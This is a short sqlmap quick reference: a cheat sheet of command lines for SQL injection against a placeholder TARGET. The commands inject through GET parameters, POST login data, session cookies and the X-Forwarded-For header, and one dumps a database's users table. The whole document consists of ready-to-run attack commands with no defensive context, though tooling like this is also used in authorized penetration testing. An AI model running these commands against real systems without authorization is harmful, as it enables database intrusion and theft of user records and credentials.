# SQLMAP QUICK REFERENCE
# ============================================================
# Basic
sqlmap -u "http://TARGET/page?id=1" --batch --dbs

# POST
sqlmap -u "http://TARGET/login" --data="user=admin&pass=test" --batch --dbs

# With cookie
sqlmap -u "http://TARGET/page?id=1" --cookie="session=VALUE" --batch --dbs

# Dump table
sqlmap -u "http://TARGET/page?id=1" --batch -D dbname -T users --dump

# Specify technique
sqlmap -u "http://TARGET/page?id=1" --batch --technique=T --dbs

# Header injection
sqlmap -u "http://TARGET/" --headers="X-Forwarded-For: *" --batch --dbs
